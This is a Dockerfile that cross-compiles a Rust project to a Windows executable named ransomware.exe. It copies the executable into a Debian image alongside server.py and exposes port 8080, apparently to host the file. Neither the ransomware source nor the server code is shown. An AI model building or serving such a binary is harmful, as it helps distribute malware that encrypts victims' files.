# Dockerfile
FROM rust:1.75 AS builder

WORKDIR /app
COPY Cargo.toml .
COPY src ./src

# Windows用にクロスコンパイル
RUN rustup target add x86_64-pc-windows-gnu
RUN apt-get update && apt-get install -y mingw-w64
RUN cargo build --release --target x86_64-pc-windows-gnu

FROM debian:bookworm-slim

RUN apt-get update && apt-get install -y \
    ca-certificates \
    python3 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY --from=builder /app/target/x86_64-pc-windows-gnu/release/ransomware.exe .
COPY server.py .

EXPOSE 8080

CMD ["python3", "server.py"]
